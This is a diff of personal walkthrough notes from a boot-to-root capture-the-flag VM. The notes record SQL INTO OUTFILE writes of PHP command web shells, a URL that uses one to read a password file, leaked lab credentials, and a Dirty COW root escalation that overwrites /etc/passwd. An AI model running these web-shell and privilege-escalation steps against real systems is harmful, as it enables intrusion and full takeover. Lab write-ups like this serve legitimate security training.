@@ -219,6 +219,9 @@ Best regards.
 ## Connexion :
 root
 Fg-'kKXBj87E:aJ$
+Fg-'kKXBj87E:a$J
+Fg-'kKXBj87E:Ja$
+Fg-'kKXBj87E:J$a
 
 ## User email list FORUM
 - admin@borntosec.net
@@ -246,11 +249,157 @@ load data infile "/etc/passwd" into table mysql.test FIELDS TERMINATED BY '\n';
 
 create a file =
 
-select "<? System($_REQUEST[‘whoami’]); ?>" into outfile '/var/www/cmd.php';
+select "<? System($_REQUEST[‘cmd’]); ?>" into outfile '/var/www/cmd.php';
 
-0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90
+POC =
+SELECT '<?php phpinfo() ?>' INTO OUTFILE '/var/www/forum/templates_c/info.php' ;
 
-## A list of user password hash ? 
+## ON THE FORUM PAGE
+
+cmd injection = SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/cmd0.php' ;
+
+https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql
+
+https://192.168.56.5/forum/templates_c/cmd0.php?cmd=cat%20 ../../../../home/LOOKATME/password
+
+lmezard:
+G!@M6f4Eatau{sF"
+
+## FTP CONNEXION
+
+ftp 192.168.56.5
+Connected to 192.168.56.5.
+220 Welcome on this server
+Name (192.168.56.5:kali): lmezard
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+ftp> ls
+229 Entering Extended Passive Mode (|||18787|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+
+## EXPLOITING THE FILES
+└─$ cat README    
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+└─$ file fun
+fun: POSIX tar archive (GNU)
+└─$ tar xvf fun
+
+PCAP file but not realy, ascii
+cat * look like there is a program. Some function are in order but others not. Trying bruteforce way with the letters i don't have the order but time consuming.
+Look like //fileXX gives us a hint about the order: sorted the return 'x'; with the getmeX() function :
+cat *.pcap | grep -A 9 -E 'getme|return'
+
+`
+#include <string.h>
+#include <stdio.h>
+
+char getme6() {
+        return 't';
+}
+char getme7() {
+        return 'p';
+}
+char getme3() {
+        return 'e';
+}
+char getme4() {
+        return 'a';
+}
+
+char getme1() {
+        return 'I';
+}
+char getme2() {
+        return 'h';
+}
+char getme5() {
+        return 'r';
+}
+char getme8() {
+        return 'w';
+}
+char getme9() {
+        return 'n';
+}
+char getme10() {
+        return 'a';
+}
+char getme11() {
+        return 'g';
+}
+char getme12(){
+        return 'e';
+}
+int main() {
+        printf("M");
+        printf("Y");
+        printf(" ");
+        printf("P");
+        printf("A");
+        printf("S");
+        printf("S");
+        printf("W");
+        printf("O");
+        printf("R");
+        printf("D");
+        printf(" ");
+        printf("I");
+        printf("S");
+        printf(":");
+        printf(" ");
+        printf("%c",getme1());
+        printf("%c",getme2());
+        printf("%c",getme3());
+        printf("%c",getme4());
+        printf("%c",getme5());
+        printf("%c",getme6());
+        printf("%c",getme7());
+        printf("%c",getme8());
+        printf("%c",getme9());
+        printf("%c",getme10());
+        printf("%c",getme11());
+        printf("%c",getme12());
+        printf("\n");
+        printf("Now SHA-256 it and submit");
+}
+`
+
+└─$ ./a.out 
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+
+result of sha-256 :
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+### On the machine Laurie
+uname -a
+Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
+
+Dirty COW (CVE-2016-5195) : Kernel version 3.2.0 vuln 
+
+laurie@BornToSecHackMe:/tmp$ ./dirty password
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: password
+Complete line:
+b2r:b2YUoYX2JpSKY:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+
+
+^C
+laurie@BornToSecHackMe:/tmp$ su b2r
+Password:
+b2r@BornToSecHackMe:/tmp# id
+uid=0(b2r) gid=0(root) groups=0(root)
+
 -----------------
 
 For an RCE :
